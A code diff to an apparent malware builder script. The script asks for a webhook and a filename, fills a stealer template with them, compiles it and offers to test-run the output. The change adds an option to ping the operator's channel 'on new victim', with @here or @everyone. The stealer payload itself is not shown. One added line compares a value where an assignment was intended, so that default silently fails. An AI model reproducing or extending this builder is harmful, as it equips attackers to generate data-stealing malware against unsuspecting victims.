@@ -12,23 +12,32 @@ from colorama import Fore, Style, init
 class Builder:
     def __init__(self) -> None:
         self.loading()
-        
+
         if not self.check():
             exit()
-            
+
         self.webhook = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Enter your webhook: ')
         self.filename = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Enter your filename: ')
-        
+        self.ping = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Ping on new victim? (y/n): ')
+
+        if self.ping.lower() == 'y':
+            self.ping = True
+
+            self.pingtype = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Ping type (here/everyone): ').lower()
+            if self.pingtype not in ["here", "everyone"]:
+                self.pingtype == "here" # default to @here if invalid ping type.
+        else:
+            self.ping = False
+            self.pingtype = "none"
+
         self.mk_file(self.filename, self.webhook)
-        
+
         print(f'{Fore.MAGENTA}[+]{Fore.RESET} Built!')
-        
+
         run = input(f'\n\n\n{Fore.MAGENTA}[+]{Fore.RESET} Do you want to test run the file? [y/n]: ')
         if run.lower() == 'y':
             self.run(self.filename)
-        else:
-            pass
-        
+
         input(f'{Fore.MAGENTA}[+]{Fore.RESET} Press enter to exit...')
         
     def loading(self):
@@ -90,15 +99,15 @@ class Builder:
 
         num = random.randint(30,40)
         with alive_bar(num) as bar:
-            for banner in range(num):
+            for _ in range(num):
                 print(img)
                 time.sleep(random.randint(1,3)/num)
                 os.system('cls')
-                
+
                 bar()
-                
+
             os.system('cls')
-        
+
         print(Style.RESET_ALL)
     
     def check(self):
@@ -133,7 +142,9 @@ class Builder:
             code = f.read()
 
         with open(f"{filename}.py", "w", encoding="utf-8") as f:
-            f.write(code.replace('%webhook_here%', webhook))
+            f.write(code.replace('%webhook_here%', webhook)
+                    .replace("\"%ping_enabled%\"", str(self.ping))
+                    .replace("%ping_type%", self.pingtype))
         
         self.compile(filename)
             
@@ -150,7 +161,7 @@ class Builder:
                 if os.path.isdir(clean):
                     shutil.rmtree(clean)
                     print(f'{Fore.MAGENTA}[+]{Fore.RESET} {clean} removed!')
-            except:
+            except Exception:
                 print(f'{Fore.RED}[!]{Fore.RESET} {clean} not found!')
                 continue
         
@@ -159,7 +170,7 @@ class Builder:
                 if os.path.isfile(clean):
                     os.remove(clean)
                     print(f'{Fore.MAGENTA}[+]{Fore.RESET} {clean} removed!')
-            except:
+            except Exception:
                 print(f'{Fore.RED}[!]{Fore.RESET} {clean} not found!')
                 continue
     
@@ -171,11 +182,11 @@ class Builder:
         
 if __name__ == '__main__':
     init()
-    
-    if not os.name == "nt":
+
+    if os.name != "nt":
         os.system("clear")
     else:
         os.system('mode con:cols=212 lines=212')
         os.system("cls")
-    
+
     Builder()
